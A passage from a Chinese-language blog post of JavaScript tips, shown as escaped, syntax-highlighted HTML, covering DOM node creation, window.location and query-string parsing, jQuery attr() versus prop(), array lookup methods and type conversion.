&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;container&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;container&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;container&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;appendChild&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;createNode&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2domparser&#34;&gt;2.DOMParser&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;createDocument&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;template&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;div class=&amp;#39;child&amp;#39;&amp;gt;${txt}&amp;lt;/div&amp;gt;&amp;#34;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;doc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DOMParser&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;parseFromString&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;template&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;doc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;querySelector&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.child&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;;
}
  
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;container&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;container&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;container&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;appendChild&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;createDocument&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3documentfragment&#34;&gt;3.DocumentFragment&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;createDocumentFragment&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;template&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;div class=&amp;#39;child&amp;#39;&amp;gt;${txt}&amp;lt;/div&amp;gt;&amp;#34;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;frag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;createRange&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;createContextualFragment&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;template&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;frag&lt;/span&gt;;
}
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;container&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;container&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;container&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;appendChild&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;createDocumentFragment&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7获取当前页面-url-或-get-的参数&#34;&gt;7.获取当前页面 Url 或 Get 的参数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取完整URL */&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;/* http://127.0.0.1:8020/Test/index.html#test?name=test */&lt;/span&gt;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pathname&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取文件路径(文件地址) */&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;/* /Test/index.html */&lt;/span&gt;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;protocol&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取协议 */&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;/* http */&lt;/span&gt;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;host&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取主机地址和端口号 */&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;/* http://127.0.0.1:8020/ */&lt;/span&gt;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;hostname&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取主机地址 */&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;/* http://127.0.0.1/ */&lt;/span&gt;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取端口号 */&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;/* 8020 */&lt;/span&gt;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取锚点(&amp;#34;#&amp;#34;后面的分段)*/&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;/* #test?name=test */&lt;/span&gt;
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;search&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* 获取属性(&amp;#34;?&amp;#34;后面的分段)*/&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;);
 
&lt;span style=&#34;color:#75715e&#34;&gt;/* 获取请求参数的值 */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetQueryString&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(^|&amp;amp;)&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=([^&amp;amp;]*)(&amp;amp;|$)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;i&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;search&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;substr&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;match&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;reg&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;//获取url中&amp;#34;?&amp;#34;符后的字符串并正则匹配
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;){
        &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;reg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;undefined&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Null&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8jquery-函数-attr-和-prop-的区别&#34;&gt;8.jQuery 函数 attr() 和 prop() 的区别&lt;/h2&gt;
&lt;p&gt;attr()，attribute 和 prop()，property，都表示&amp;quot;属性&amp;quot;的意思，但是两者操作的对象不同。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;attr() 函数操作的是文档节点的属性，因此设置的属性值只能是字符串类型，如果不是字符串类型，也会调用其 toString() 方法，将其转为字符串类型。&lt;/li&gt;
&lt;li&gt;prop() 函数操作的是 JS 对象的属性，因此设置的属性值可以为包括数组和对象在内的任意类型。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 jQuery 1.6 之后，对于表单元素的 checked、selected、disabled 等属性，使用 attr() 获取这些属性的返回值为 String 类型，如果被选中(或禁用)就返回checked、selected 或 disabled，否则(即元素节点没有该属性)返回 undefined。而使用 prop() 则返回 bool 值的 true 与 false 以表示该属性实时状态。&lt;/p&gt;
&lt;h2 id=&#34;9判断数组是否包含指定的值&#34;&gt;9.判断数组是否包含指定的值&lt;/h2&gt;
&lt;h3 id=&#34;1arrayindexofvalue&#34;&gt;1.array.indexOf(value)&lt;/h3&gt;
&lt;p&gt;此方法判断数组中是否存在某个值，如果存在返回数组元素的下标，否则返回-1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;something&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;anything&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nothing&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;anything&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nothing&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;//结果是2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2arrayincludesvalue&#34;&gt;2.array.includes(value)&lt;/h3&gt;
&lt;p&gt;此方法判断数组中是否存在某个值，如果存在返回 true，否则返回false。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;redFruits&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apple&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;strawberry&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cherry&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cranberries&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;redFruits&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;includes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fruit&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3arrayfindcallback&#34;&gt;3.array.find(callback())&lt;/h3&gt;
&lt;p&gt;返回数组中满足条件的第一个元素的值，如果没有，返回undefined&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ---------- 元素是普通字面值 ----------
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;numbers&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;];
&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;numbers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;find&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt; =&amp;gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
});&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;// 结果： 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ---------- 元素是对象 ----------
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    {&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;something&amp;#39;&lt;/span&gt;},
    {&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;anything&amp;#39;&lt;/span&gt;},
    {&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nothing&amp;#39;&lt;/span&gt;},
    {&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;anything&amp;#39;&lt;/span&gt;}
];
&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;find&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt; =&amp;gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
});&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;) 
&lt;span style=&#34;color:#75715e&#34;&gt;// 结果： Object { id: 3, name: &amp;#34;nothing&amp;#34; }
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;10强制类型转换&#34;&gt;10.强制类型转换&lt;/h2&gt;
&lt;p&gt;将其他数据类型（除 option）转换成 String 类型，注意 Null 与 Undefined 无 toString() 方法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;()
String(&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将其他的数据类型转换为 Number 类型，注意对非数字字符类型会转换为 NaN，Null 会转换为 0&lt;/p&gt;
